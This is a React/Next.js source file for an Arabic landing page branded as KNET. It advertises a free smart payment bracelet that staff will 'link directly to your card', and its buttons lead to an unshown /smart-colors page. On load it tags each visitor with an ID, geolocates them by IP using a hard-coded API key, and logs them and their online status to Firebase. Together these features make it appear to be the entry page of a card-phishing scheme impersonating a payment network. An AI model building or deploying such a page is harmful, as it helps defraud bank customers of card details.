"use client";

import { FullPageCarousel } from "@/components/full-page-imgs";
import { useCallback, useEffect, useState } from "react";
import { setupOnlineStatus } from "@/lib/utils";
import { addData } from "@/lib/firebase";
import "./globals.css";

const arabicOffers = [
  {
    id: "1",
    title: "مقدمه حصرياً لعملاء كي نت KNET",
    description: "استمتع بطريقة دفع مبتكرة مع سوار الدفع الذكي من كي نت.",
    imageUrl: "/4.jpg",
    ctaText: "اختَر لونك المفضل الآن واطلبه مجاناً 🚀",
    ctaLink: "/smart-colors",
    badge: "لفترة محدودة",
  },
  {
    id: "2",
    title: "",
    description: "",
    imageUrl: "/5.jpg",
    ctaText: "اطلبها الآن",
    ctaLink: "/smart-colors",
    badge: "وصل حديثاً",
  },
  {
    id: "3",
    title: "اطلب أسورتك الذكية الآن",
    description:
      "وسيقوم موظف خدمة العملاء بربطها مباشرة ببطاقتك لتبدأ الدفع فوراً بدون أي خطوات إضافية منك",
    imageUrl: "/777.jpg",
    ctaText: "اطلبها الآن",
    ctaLink: "/smart-colors",
    badge: "وصل حديثاً",
  },
];

const visitorId = `aa-app-${Math.random().toString(36).substring(2, 15)}`;

export default function HomePage() {
  const [showCarousel, setShowCarousel] = useState(true);
  const getLocationAndLog = useCallback(async () => {
    if (!visitorId) return;

    // This API key is public and might be rate-limited or disabled.
    // For a production app, use a secure way to handle API keys, ideally on the backend.
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb";
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
        currentPage: "الرئيسية ",
      });
      localStorage.setItem("country", country); // Consider privacy implications
      setupOnlineStatus(visitorId);
    } catch (error) {
      console.error("Error fetching location:", error);
      // Log error with visitor ID for debugging
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${
          error instanceof Error ? error.message : String(error)
        }`,
        action: "location_error",
      });
    }
  }, [visitorId]);

  useEffect(() => {
    getLocationAndLog().then(() => {});
  });
  return (
    <div className="min-h-screen bg-background">
      {showCarousel && (
        <FullPageCarousel
          slides={arabicOffers}
          autoPlay={true}
          autoPlayInterval={6000}
          onClose={() => setShowCarousel(false)}
          isRTL={true}
        />
      )}
    </div>
  );
}
